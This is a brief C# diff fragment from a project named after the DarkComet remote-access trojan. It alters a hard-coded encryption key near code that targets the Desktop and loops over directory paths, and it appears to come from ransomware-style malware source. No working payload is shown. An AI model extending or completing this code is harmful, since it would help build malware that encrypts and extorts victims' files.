@@ -20,7 +20,7 @@ namespace darkcomet
             };
             string droptext = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            
-            string encryptionKey = "hello123";
+            string encryptionKey = "";
 
             
             foreach (string directoryPath in directoryPaths)
